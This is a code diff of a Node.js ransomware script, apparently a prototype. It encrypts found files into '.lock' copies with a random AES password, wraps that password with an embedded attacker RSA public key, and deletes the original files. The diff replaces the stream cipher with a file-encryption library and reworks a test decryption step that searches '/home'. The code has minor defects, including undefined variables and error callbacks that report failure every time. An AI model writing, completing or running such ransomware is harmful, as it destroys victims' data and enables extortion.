@@ -1,6 +1,9 @@
 var fileFinder = require('fs-finder');
 var fileStream = require('fs');
 var ursa = require('ursa');
+var encryptor = require('file-encryptor');
+var options = { algorithm: 'aes256' };
+
 
 var pubkeyTrudy = '-----BEGIN PUBLIC KEY-----\n'+
 'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZSCnqlU26QVvPINDZ5Om4nSG0\n'+
@@ -24,7 +27,7 @@ var encryptedFiles = [];
 //   return crypted;
 // }
 var secureRandom = require('secure-random-string');
-  var password = secureRandom(64);
+var password = secureRandom(64);
 function decrypt(text){
   var decipher = crypto.createDecipher(algorithm,password)
   var dec = decipher.update(text,'hex','utf8')
@@ -39,27 +42,23 @@ function encryptFiles(files){
   //var password = secureRandom(64);
   var pubkey = ursa.createPublicKey(pubkeyTrudy);
   encryptedKey = pubkey.encrypt(password, 'utf8', 'base64');
-  var cipher = crypto.createCipher(algorithm,password);
 
   files.forEach(function(file) { 
-   var input = fileStream.createReadStream(file);
-   var output = fileStream.createWriteStream(file +'.lock');
-   input.pipe(cipher).pipe(output);
+   encryptor.encryptFile(file, file+'.lock', password, options, function(err) {
+     console.log('Cannot encrypt: ' + file);
+   });
    encryptedFiles.push(file +'.lock');
  });
 }
 
 function deCryptFiles(key){
-  var deCipher = crypto.createDecipher(algorithm, key);
+  //var deCipher = crypto.createDecipher(algorithm, key);
 
   encryptedFiles.forEach(function(file) {
-   var input = fileStream.readFileSync(file);
-console.log(input);
-   //var output = fileStream.createWriteStream(file+ '.foo');
-   //input.pipe(deCipher).pipe(output);
-   var finalOutput = decrypt(input);
-   console.log(finalOutput);
- });
+   encryptor.decryptFile(file, file + '.foo', key, options, function(err) {
+    console.log('Cannot de the file: '+ file);
+   });
+  });
 }
 
 function deleteOriginalFiles(files) {
@@ -100,10 +99,11 @@ deleteOriginalFiles(files);
 console.log(encryptedFiles);
 console.log('Encrypted');
 
-console.log('Encrypted DeCrypting now........\n\n\n');
+console.log('DeCrypting now........\n\n');
+
 deCryptFiles(password);
 
 
 //console.log(currentPath);
 
-console.log(files);
+console.log(fileFinder.from('/home').findFiles('*.foo'));
